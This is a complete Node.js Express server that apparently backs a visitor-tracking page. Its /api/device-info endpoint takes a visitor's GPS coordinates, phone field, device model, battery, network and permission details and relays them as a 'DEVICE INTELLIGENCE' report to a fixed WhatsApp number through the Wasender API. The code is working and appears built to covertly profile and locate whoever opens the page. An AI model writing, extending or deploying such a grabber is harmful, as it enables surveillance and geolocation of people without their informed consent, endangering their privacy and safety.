const express = require("express");
const path = require("path");

const app = express();

const PORT = process.env.PORT || 10000;

const WASENDER_TOKEN =
    process.env.WASENDER_TOKEN;

const WHATSAPP_TO =
    process.env.WHATSAPP_TO;


/* =========================================================
   MIDDLEWARE
   ========================================================= */

app.use(
    express.json({
        limit: "100kb"
    })
);

app.use(
    express.static(__dirname)
);


/* =========================================================
   HOME
   ========================================================= */

app.get("/", (req, res) => {

    res.sendFile(
        path.join(
            __dirname,
            "index.html"
        )
    );

});


/* =========================================================
   DEVICE INFORMATION API
   ========================================================= */

app.post(
    "/api/device-info",
    async (req, res) => {

        try {

            if (
                !WASENDER_TOKEN ||
                !WHATSAPP_TO
            ) {

                return res.status(500).json({

                    success: false,

                    error:
                        "WhatsApp configuration is missing."

                });

            }


            const data =
                req.body;


            if (
                !data ||
                typeof data !== "object"
            ) {

                return res.status(400).json({

                    success: false,

                    error:
                        "Invalid device information."

                });

            }


            const message =
                buildWhatsAppMessage(data);


            const response =
                await fetch(
                    "https://api.wasender.dev/messages/text",
                    {

                        method: "POST",

                        headers: {

                            "Authorization":
                                `Bearer ${WASENDER_TOKEN}`,

                            "Content-Type":
                                "application/json"

                        },

                        body:
                            JSON.stringify({

                                to:
                                    WHATSAPP_TO,

                                body:
                                    message

                            })

                    }
                );


            const result =
                await response.json();


            if (!response.ok) {

                console.error(
                    "Wasender error:",
                    result
                );


                return res.status(502).json({

                    success: false,

                    error:
                        "WhatsApp service rejected the message."

                });

            }


            return res.json({

                success: true,

                sent: true

            });


        } catch (error) {

            console.error(
                "Server error:",
                error
            );


            return res.status(500).json({

                success: false,

                error:
                    "Internal server error."

            });

        }

    }
);


/* =========================================================
   HELPERS
   ========================================================= */

function value(
    input,
    fallback = "Unavailable"
) {

    if (
        input === undefined ||
        input === null ||
        input === ""
    ) {

        return fallback;

    }

    return input;

}


function yesNo(input) {

    if (input === true) {
        return "YES";
    }

    if (input === false) {
        return "NO";
    }

    return "UNKNOWN";

}


/* =========================================================
   LOCATION
   ========================================================= */

function formatLocation(location) {

    if (!location) {
        return "Unavailable";
    }


    if (
        location.permission !==
        "granted"
    ) {

        return [
            `Permission : ${
                value(location.permission)
            }`

        ].join("\n");

    }


    return [

        "Permission : GRANTED",

        `Latitude  : ${
            value(location.latitude)
        }`,

        `Longitude : ${
            value(location.longitude)
        }`,

        `Accuracy  : ${
            value(location.accuracy)
        } m`

    ].join("\n");

}


/* =========================================================
   PERMISSIONS
   ========================================================= */

function formatPermissions(
    permissions
) {

    if (
        !permissions ||
        typeof permissions !== "object"
    ) {

        return "Unavailable";

    }


    return Object.entries(
        permissions
    )
        .map(
            ([key, val]) =>
                `│ ${key.padEnd(
                    14,
                    " "
                )}: ${value(val)}`
        )
        .join("\n");

}


/* =========================================================
   DEVICE REPORT
   ========================================================= */

function buildWhatsAppMessage(
    data
) {

    const device =
        data.device || {};


    const os =
        data.operatingSystem || {};


    const browser =
        data.browser || {};


    const hardware =
        data.hardware || {};


    const display =
        data.display || {};


    const network =
        data.network || {};


    const battery =
        data.battery || {};


    const locale =
        data.locale || {};


    const permissions =
        data.permissions || {};


    const page =
        data.page || {};


    /*
     * Report ID
     */

    const reportId =
        createReportId();


    /*
     * Device values
     */

    const brand =
        value(
            device.brand,
            "Unavailable"
        );


    const model =
        value(
            device.model,
            "Unavailable"
        );


    const manufacturer =
        value(
            device.manufacturer,
            "Unavailable"
        );


    const deviceName =
        value(
            device.name,
            "Unavailable"
        );


    const phone =
        value(
            device.phone,
            "Unavailable"
        );


    /*
     * OS
     */

    const osName =
        detectOS(
            os.userAgent
        );


    /*
     * Build message
     */

    return [

        "╔══════════════════════════════╗",

        "          𝕳𝖅𝕽𝟏⁹",

        "      DEVICE INTELLIGENCE",

        "╚══════════════════════════════╝",


        "",


        "┌─ REPORT ─────────────────────┐",

        `│ ID        : #HZR-${reportId}`,

        `│ Time      : ${
            value(data.entryTime)
        }`,

        `│ Status    : ONLINE`,

        "└──────────────────────────────┘",


        "",


        "┌─ DEVICE ─────────────────────┐",

        `│ Brand     : ${brand}`,

        `│ Model     : ${model}`,

        `│ Company   : ${manufacturer}`,

        `│ Name      : ${deviceName}`,

        `│ Phone     : ${phone}`,

        `│ Type      : ${
            value(device.type)
        }`,

        `│ Mobile    : ${
            yesNo(device.mobile)
        }`,

        `│ Touch     : ${
            yesNo(device.touch)
        }`,

        `│ Touch Pts : ${
            value(device.maxTouchPoints)
        }`,

        "└──────────────────────────────┘",


        "",


        "┌─ SYSTEM ─────────────────────┐",

        `│ OS        : ${osName}`,

        `│ Platform  : ${
            value(os.platform)
        }`,

        `│ CPU       : ${
            value(hardware.cpuCores)
        } Cores`,

        `│ RAM       : ${
            hardware.ramGB
                ? hardware.ramGB + " GB"
                : "Unavailable"
        }`,

        "└──────────────────────────────┘",


        "",


        "┌─ BROWSER ────────────────────┐",

        `│ Browser   : ${
            value(browser.name)
        }`,

        `│ Language  : ${
            value(browser.language)
        }`,

        `│ Cookies   : ${
            yesNo(browser.cookiesEnabled)
        }`,

        `│ Online    : ${
            yesNo(browser.online)
        }`,

        "└──────────────────────────────┘",


        "",


        "┌─ DISPLAY ────────────────────┐",

        `│ Resolution: ${
            value(display.width)
        } × ${
            value(display.height)
        }`,

        `│ Viewport  : ${
            value(display.viewportWidth)
        } × ${
            value(display.viewportHeight)
        }`,

        `│ Pixel Ratio: ${
            value(display.pixelRatio)
        }`,

        `│ Color Depth: ${
            value(display.colorDepth)
        }`,

        `│ Touch Pts : ${
            value(display.touchPoints)
        }`,

        "└──────────────────────────────┘",


        "",


        "┌─ NETWORK ────────────────────┐",

        `│ Online    : ${
            yesNo(browser.online)
        }`,

        `│ Type      : ${
            value(network.type)
        }`,

        `│ Effective : ${
            value(network.effectiveType)
        }`,

        `│ Downlink  : ${
            value(network.downlink)
        }`,

        `│ RTT       : ${
            value(network.rtt)
        }`,

        `│ Save Data : ${
            yesNo(network.saveData)
        }`,

        "└──────────────────────────────┘",


        "",


        "┌─ BATTERY ────────────────────┐",

        `│ Supported : ${
            yesNo(battery.supported)
        }`,

        `│ Level     : ${
            battery.supported
                ? value(battery.level) + "%"
                : "Unavailable"
        }`,

        `│ Charging  : ${
            battery.supported
                ? yesNo(battery.charging)
                : "Unavailable"
        }`,

        "└──────────────────────────────┘",


        "",


        "┌─ LOCATION ───────────────────┐",

        formatLocation(
            data.location
        )
            .split("\n")
            .map(
                line =>
                    `│ ${line}`
            )
            .join("\n"),

        "└──────────────────────────────┘",


        "",


        "┌─ PERMISSIONS ────────────────┐",

        formatPermissions(
            permissions
        ),

        "└──────────────────────────────┘",


        "",


        "┌─ LOCALE ─────────────────────┐",

        `│ Language  : ${
            value(locale.language)
        }`,

        `│ Timezone  : ${
            value(locale.timezone)
        }`,

        "└──────────────────────────────┘",


        "",


        "┌─ PAGE ───────────────────────┐",

        `│ Title     : ${
            value(page.title)
        }`,

        `│ URL       : ${
            value(page.url)
        }`,

        "└──────────────────────────────┘",


        "",


        "────────────────────────────────",

        "            𝕳𝖅𝕽𝟏⁹",

        "        DEVICE CENTER",

        "────────────────────────────────"

    ].join("\n");

}


/* =========================================================
   OS DETECTION
   ========================================================= */

function detectOS(
    userAgent
) {

    const ua =
        userAgent || "";


    let match;


    match =
        ua.match(
            /Android\s+([0-9.]+)/i
        );


    if (match) {

        return `Android ${match[1]}`;

    }


    if (
        /iPhone|iPad|iPod/i.test(ua)
    ) {

        return "iOS";

    }


    if (/Windows/i.test(ua)) {
        return "Windows";
    }


    if (/Mac OS X/i.test(ua)) {
        return "macOS";
    }


    if (/Linux/i.test(ua)) {
        return "Linux";
    }


    return "Unknown";

}


/* =========================================================
   REPORT ID
   ========================================================= */

function createReportId() {

    return Math.random()
        .toString(36)
        .substring(2, 10)
        .toUpperCase();

}


/* =========================================================
   START SERVER
   ========================================================= */

app.listen(
    PORT,
    "0.0.0.0",
    () => {

        console.log(
            `HZR server running on port ${PORT}`
        );

    }
);
